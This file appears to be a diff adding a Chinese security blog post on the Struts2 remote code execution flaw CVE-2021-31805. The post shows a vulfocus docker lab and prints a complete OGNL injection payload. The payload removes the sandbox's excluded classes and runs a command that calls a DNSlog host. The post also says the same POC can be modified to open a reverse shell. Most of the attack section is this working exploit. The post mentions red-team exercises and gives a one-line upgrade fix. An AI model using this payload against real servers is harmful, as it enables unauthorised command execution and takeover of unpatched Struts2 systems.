@@ -1,0 +1,207 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>Struts2--远程代码执行漏洞 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/3131/logo.png')">
+            </div>
+          
+          <h2 class="post-title">Struts2--远程代码执行漏洞</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-04-14</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/cve-2021-31805/">
+                    CVE-2021-31805
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/struts2/">
+                    struts2
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/apache/">
+                    apache
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>最近爆出一个Struts2的RCE，这个时间点感觉近期的HVV可能用得上。记录备忘。</p>
+<!-- more -->
+<h3 id="0x01-漏洞详情">0x01 漏洞详情</h3>
+<p>该漏洞是由于对S2-061（CVE-2020-17530）的修复不完整，如果开发人员使用 %{xxx} 语法进行强制OGNL解析时，标签的某些属性仍然可被二次解析。当解析未经验证的用户输入时可能会导致远程代码执行。</p>
+<h3 id="0x02-影响范围">0x02 影响范围</h3>
+<blockquote>
+<p>Struts 2.0.0 --- Struts 2.5.29</p>
+</blockquote>
+<h3 id="0x03-漏洞搭建">0x03 漏洞搭建</h3>
+<p>在vulfocus上有现成的docker靶场环境，直接拉取即可。也可以看看之前的文章，<a href="https://mari0er.top/post/vulfocus.html/">本地搭建vulfocus环境</a>。</p>
+<pre><code>docker pull vulfocus/struts2-cve_2021_31805
+docker run -t -i -p 9090:8080 vulfocus/struts2-cve_2021_31805:latest
+</code></pre>
+<p>根据提示，路径是/s2_062/index.action，参数是<strong>name</strong><br>
+<img src="https://tuchuang.looklook.workers.dev/3131/name.png" alt="" loading="lazy"></p>
+<h3 id="0x04-漏洞利用">0x04 漏洞利用</h3>
+<ol>
+<li>由于靶场环境没有回显，可以用DNSlog进行检测，payload如下（BP发包需要进行URL编码）</li>
+</ol>
+<pre><code>(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
+(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
+(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
+(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
+(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
+(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'ping xxxxxx.dnslog.cn'}))
+</code></pre>
+<p>利用这个<a href="https://github.com/YanMu2020/s2-062">POC</a>，修改成自己获取的域名即可<br>
+<img src="https://tuchuang.looklook.workers.dev/3131/dnslog.png" alt="" loading="lazy"></p>
+<ol start="2">
+<li>能命令执行当然就能反弹Shell，首先在这个<a href="https://ir0ny.top/pentest/reverse-encoder-shell.html">网站</a>通过Base64加密一下命令，之后同样修改POC，即可反弹shell。<br>
+<img src="https://tuchuang.looklook.workers.dev/3131/base64.png" alt="" loading="lazy"></li>
+</ol>
+<h3 id="0x03-漏洞修复">0x03 漏洞修复</h3>
+<p>升级Struts2版本至2.5.29以上</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/spring4shell.html/">
+              <h3 class="post-title">
+                下一篇：Spring4shell--远程命令执行漏洞
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
